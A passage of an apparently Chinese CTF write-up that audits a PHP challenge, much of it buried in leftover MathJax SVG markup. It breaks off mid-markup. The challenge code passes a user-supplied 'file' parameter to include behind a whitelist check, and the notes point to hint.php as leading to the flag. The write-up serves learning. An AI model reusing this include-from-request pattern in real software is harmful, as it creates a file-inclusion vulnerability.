<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-70" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-61" x="456" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="985" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1466" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1932" y="0"></use>
</g>
</svg>whitelist)) {<br>                return true;<br>            }<br>            echo “you can’t see it”;<br>            return false;<br>        }<br>    }</p>
<p>    if (! empty($_REQUEST[‘file’])<br>        &amp;&amp; is_string($_REQUEST[‘file’])<br>        &amp;&amp; emmm::checkFile($_REQUEST[‘file’])<br>    ) {<br>        include $_REQUEST[‘file’];<br>        exit;<br>    } else {<br>        echo “<br>&lt;img src=&quot;<a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg/&quot;">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot;</a> /&gt;”;<br>    } <br>?&gt;`</p>
<h2 id="通过审计"><a href="#通过审计" class="headerlink" title="通过审计"></a>通过审计</h2><p><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code>可以发现可以一个文件-hint.php</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627198227025-b63df99c-5b2f-4d26-bb59-d84a4e0a83d7.png#align=left&display=inline&height=69&margin=%5Bobject%20Object%5D&name=image.png&originHeight=137&originWidth=857&size=6104&status=done&style=none&width=428.5" alt="image.png"><br>flag在该文件内</p>
<h2 id="继续审计source内的代"><a href="#继续审计source内的代" class="headerlink" title="继续审计source内的代"></a>继续审计source内的代</h2><p><code>if (! empty(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="21.538ex" height="3.009ex" style="vertical-align: -0.838ex;" viewBox="0 -934.9 9273.2 1295.7" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_REQUEST['file']) //</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-52" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path>
<path stroke-width="1" id="E1-MJMATHI-51" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path>
<path stroke-width="1" id="E1-MJMATHI-55" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path>
<path stroke-width="1" id="E1-MJMATHI-53" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path>
<path stroke-width="1" id="E1-MJMATHI-54" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
<path stroke-width="1" id="E1-MJMAIN-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-52" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-45" x="637" y="0"></use>
 <use xlink:href="#E1-MJMATHI-51" x="1401" y="0"></use>
 <use xlink:href="#E1-MJMATHI-55" x="2193" y="0"></use>
 <use xlink:href="#E1-MJMATHI-45" x="2960" y="0"></use>
 <use xlink:href="#E1-MJMATHI-53" x="3725" y="0"></use>
 <use xlink:href="#E1-MJMATHI-54" x="4370" y="0"></use>
<g transform="translate(5075,0)">
 <use xlink:href="#E1-MJMAIN-5B" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="393" y="583"></use>
</g>
 <use xlink:href="#E1-MJMATHI-66" x="5648" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="6198" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="6544" y="0"></use>
<g transform="translate(6842,0)">
 <use xlink:href="#E1-MJMATHI-65" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="659" y="583"></use>
</g>
 <use xlink:href="#E1-MJMAIN-5D" x="7604" y="0"></use>
 <use xlink:href="#E1-MJMAIN-29" x="7882" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8272" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8772" y="0"></use>
</g>
</svg>_REQUEST[&#39;file&#39;]内的值不为空         &amp;&amp; is_string(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="21.538ex" height="3.009ex" style="vertical-align: -0.838ex;" viewBox="0 -934.9 9273.2 1295.7" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_REQUEST['file']) //</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-52" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path>
<path stroke-width="1" id="E1-MJMATHI-51" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path>
<path stroke-width="1" id="E1-MJMATHI-55" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path>
<path stroke-width="1" id="E1-MJMATHI-53" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path>
<path stroke-width="1" id="E1-MJMATHI-54" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
<path stroke-width="1" id="E1-MJMAIN-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-52" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-45" x="637" y="0"></use>
 <use xlink:href="#E1-MJMATHI-51" x="1401" y="0"></use>
 <use xlink:href="#E1-MJMATHI-55" x="2193" y="0"></use>
 <use xlink:href="#E1-MJMATHI-45" x="2960" y="0"></use>
 <use xlink:href="#E1-MJMATHI-53" x="3725" y="0"></use>
 <use xlink:href="#E1-MJMATHI-54" x="4370" y="0"></use>
<g transform="translate(5075,0)">
 <use xlink:href="#E1-MJMAIN-5B" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="393" y="583"></use>
</g>
 <use xlink:href="#E1-MJMATHI-66" x="5648" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="6198" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="6544" y="0"></use>
<g transform="translate(6842,0)">
 <use xlink:href="#E1-MJMATHI-65" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="659" y="583"></use>
</g>
 <use xlink:href="#E1-MJMAIN-5D" x="7604" y="0"></use>
 <use xlink:href="#E1-MJMAIN-29" x="7882" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8272" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8772" y="0"></use>
</g>
</svg>_REQUEST[&#39;file&#39;]内的内容是字符         &amp;&amp; emmm::checkFile(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="21.538ex" height="3.009ex" style="vertical-align: -0.838ex;" viewBox="0 -934.9 9273.2 1295.7" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_REQUEST['file'])  //</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-52" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path>
<path stroke-width="1" id="E1-MJMATHI-51" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path>
